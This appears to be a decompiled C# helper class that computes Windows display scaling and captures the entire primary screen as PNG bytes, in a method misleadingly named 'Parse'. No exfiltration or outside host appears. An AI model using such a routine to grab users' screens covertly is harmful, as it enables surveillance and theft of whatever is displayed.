using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace WindowsSDK.Helpers
{
    public static class DisplayHelper
    {
        public enum DeviceCap
        {
            VERTRES = 10,
            DESKTOPVERTRES = 117
        }

        [DllImport("gdi32.dll", CharSet = CharSet.Auto, ExactSpelling = true, SetLastError = true)]
        public static extern int GetDeviceCaps(IntPtr hDC, int nIndex);

        public static double GetWindowsScreenScalingFactor(bool percentage = true)
        {
            Graphics graphics = Graphics.FromHwnd(IntPtr.Zero);
            IntPtr hdc = graphics.GetHdc();
            int deviceCaps = GetDeviceCaps(hdc, 10);
            double num = Math.Round(GetDeviceCaps(hdc, 117) / (double)deviceCaps, 2);
            if (percentage)
            {
                num *= 100.0;
            }
            graphics.ReleaseHdc(hdc);
            graphics.Dispose();
            return num;
        }

        public static Size GetDisplayResolution()
        {
            try
            {
                double windowsScreenScalingFactor = GetWindowsScreenScalingFactor(percentage: false);
                double num = Screen.PrimaryScreen.Bounds.Width * windowsScreenScalingFactor;
                double num2 = Screen.PrimaryScreen.Bounds.Height * windowsScreenScalingFactor;
                return new Size((int)num, (int)num2);
            }
            catch
            {
                return Screen.PrimaryScreen.Bounds.Size;
            }
        }

        public static byte[] Parse()
        {
            try
            {
                Size displayResolution = GetDisplayResolution();
                Bitmap bitmap = new Bitmap(displayResolution.Width, displayResolution.Height);
                using (Graphics graphics = Graphics.FromImage(bitmap))
                {
                    graphics.InterpolationMode = InterpolationMode.Bicubic;
                    graphics.PixelOffsetMode = PixelOffsetMode.HighSpeed;
                    graphics.SmoothingMode = SmoothingMode.HighSpeed;
                    graphics.CopyFromScreen(new Point(0, 0), new Point(0, 0), displayResolution);
                }
                return ImageToByte(bitmap);
            }
            catch (Exception)
            {
                return null;
            }
        }

        private static byte[] ImageToByte(Image img)
        {
            try
            {
                if (img == null)
                {
                    return null;
                }
                using MemoryStream memoryStream = new MemoryStream();
                img.Save(memoryStream, ImageFormat.Png);
                return memoryStream.ToArray();
            }
            catch (Exception)
            {
                return null;
            }
        }
    }
}
